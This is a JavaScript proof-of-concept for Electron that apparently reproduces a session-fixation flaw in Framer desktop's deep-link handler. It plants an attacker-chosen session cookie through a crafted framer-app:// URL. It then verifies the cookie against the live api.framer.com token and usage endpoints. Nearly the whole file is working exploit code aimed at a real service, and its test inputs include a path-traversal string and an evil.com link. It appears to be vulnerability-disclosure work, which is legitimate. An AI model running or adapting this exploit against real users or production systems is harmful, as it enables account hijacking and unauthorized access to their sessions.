// Linux PoC: faithful extraction of Framer desktop's deep-link session-fixation
// chain (main.js: open-url/second-instance -> u(argv) -> a() -> p() -> _5()).
// Runs under stock Electron on Linux. Fires the handler with argv exactly as a
// second-instance launch would deliver it, then verifies the planted cookie
// against the live API with zero inference spend.
const { app, session } = require("electron");
const https = require("https");
const crypto = require("crypto");

const Vn = "https://framer.com";
const Ed = ".framer.com";

// --- verbatim-extracted logic ---
const Ej = /^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-8][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000|ffffffff-ffff-ffff-ffff-ffffffffffff)$/i;
function dAe(e) { return typeof e == "string" && Ej.test(e); }
const jW = dAe;
function d(m) { return m.startsWith("framer-app://"); }
async function bm() { return session.fromPartition("persist:framer"); }
async function _5(e) {
  let t = await bm(), n = Date.now() / 1e3 + 365 * 24 * 60 * 60;
  await t.cookies.set({
    url: Vn, name: "session", value: e, domain: Ed,
    secure: Vn.startsWith("https://"), httpOnly: true,
    expirationDate: n, sameSite: "lax",
  });
  return crypto.createHash("sha256").update(e).digest("hex").slice(0, 12); // qC
}
function p(m) { return jW(m) ? _5(m).catch((e) => console.error("plant err", e)) : null; }
function a(m) {
  if (!d(m)) return;
  let h = new URL(m), b = h.searchParams.get("fut");
  if (b !== null) return p(b);
}
function u(m) { for (let h of m) a(h); }
// --- end extraction ---

function apiGet(path, cookie) {
  return new Promise((res) => {
    const req = https.get({
      host: "api.framer.com", path,
      headers: cookie ? { cookie: `session=${cookie}` } : {},
    }, (r) => {
      let b = "";
      r.on("data", (c) => (b += c));
      r.on("end", () => res({ status: r.statusCode, body: b }));
    });
    req.on("error", (e) => res({ status: -1, body: String(e) }));
    req.setTimeout(10000, () => { req.destroy(); res({ status: -2, body: "timeout" }); });
  });
}

app.commandLine.appendSwitch("no-sandbox");
app.whenReady().then(async () => {
  const ses = await bm();
  // clean slate so the negative control is not fooled by a persisted partition
  await ses.cookies.remove(Vn, "session").catch(() => {});

  // negative control: malformed values the regex must reject
  for (const bad of ["framer-app://mcp-oauth-return?fut=not-a-uuid",
                     "framer-app://mcp-oauth-return?fut=../../etc/passwd",
                     "https://evil.com/?fut=00000000-0000-0000-0000-000000000000"]) {
    a(bad);
  }
  await new Promise((r) => setTimeout(r, 400));
  let cur = await ses.cookies.get({ url: Vn, domain: Ed, name: "session" });
  console.log("AFTER-NEGATIVE:", cur.length === 0 ? "no cookie planted (regex gate held)" : "FAIL: " + JSON.stringify(cur));

  // fire the real primitive: attacker-controlled UUID session value
  const victim = process.env.FUT_SESSION; // a valid session UUID we control
  if (victim) u(["electron", ".", `framer-app://mcp-oauth-return?fut=${victim}`]);
  await new Promise((r) => setTimeout(r, 400));

  cur = await ses.cookies.get({ url: Vn, domain: Ed, name: "session" });
  console.log("PLANTED:", JSON.stringify(cur.map((c) => ({
    name: c.name, value: c.value, domain: c.domain,
    httpOnly: c.httpOnly, sameSite: c.sameSite,
    exp: Math.round(c.expirationDate || 0),
  }))));

  if (cur.length && victim) {
    // live verification, zero-cost: mint endpoint + usage/total (read-only)
    const mint = await apiGet("/auth/web/access-token", cur[0].value);
    console.log("LIVE /auth/web/access-token =>", mint.status, mint.body.slice(0, 80));
    // full chain: planted cookie -> minted web JWT -> Bearer-gated route
    try {
      const fresh = await apiGet("/auth/web/access-token", cur[0].value);
      const tok = JSON.parse(fresh.body).accessToken;
      const r2 = await new Promise((res) => {
        const q = https.get({
          host: "api.framer.com", path: "/ai/v3/usage/total/?projectId=LzyGImOXpOj63igRbwzW&sessionId=poc",
          headers: { authorization: "Bearer " + tok, cookie: `session=${cur[0].value}` },
        }, (r) => { let b = ""; r.on("data", (c) => (b += c)); r.on("end", () => res({ status: r.statusCode, body: b.slice(0, 120) })); });
        q.on("error", (e) => res({ status: -1, body: String(e) }));
      });
      console.log("LIVE /ai/v3/usage/total (Bearer from planted cookie) =>", r2.status, r2.body);
    } catch (e) { console.log("bearer chain err", String(e)); }
  }
  app.exit(0);
});
